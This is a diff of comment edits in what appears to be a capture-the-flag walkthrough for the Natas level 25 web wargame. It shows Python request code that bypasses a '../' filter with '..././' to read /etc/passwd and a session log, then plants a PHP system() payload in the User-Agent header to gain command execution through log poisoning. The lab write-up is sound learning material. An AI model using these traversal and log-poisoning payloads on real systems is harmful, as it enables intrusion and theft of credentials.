@@ -486,7 +486,6 @@ if(strstr($filename,"../")){
 // So with the fallowing python code, we succeeded our LFI
 response = session.post(url, data = {'lang': '..././..././..././..././..././..././etc/passwd'}, auth=(username, password))
 // Now see the php code below, we cannot directly access /natas_webpass/ 
-        // dont let ppl steal our passwords
 if(strstr($filename,"natas_webpass")){
             logRequest("Illegal file access detected! Aborting!");
             exit(-1);
@@ -504,8 +503,8 @@ function logRequest($message){
 // We can acutally access the logs for natas25, to do that lets get the session_id, through session.cookies
 response = session.post(url, data = {'lang': '..././..././..././..././..././..././var/www/natas/natas25/logs/natas25_' + session.cookies['PHPSESSID'] + '.log'}, auth=(username, password))
 // Answer : [05.02.2019 10::01:46] python-requests/2.20.1 "Directory traversal attempt! fixing request."
-// We have controle over the user agent python-requests/2.20.1 in our http header, we can change it.
-// Lets put php code in place of our user agent
+// We have controle over the user-agent python-requests/2.20.1 in our http header, we can change it.
+// Lets put php code in place of our user agent, to process a RCE
 //
 headers = {"User-Agent": "<?php system('cat /etc/natas_webpass/natas26'); ?>"}
 response = session.post(url, headers = headers, data = {'lang': '..././..././..././..././..././..././var/www/natas/natas25/logs/natas25_' + session.cookies['PHPSESSID'] + '.log'},
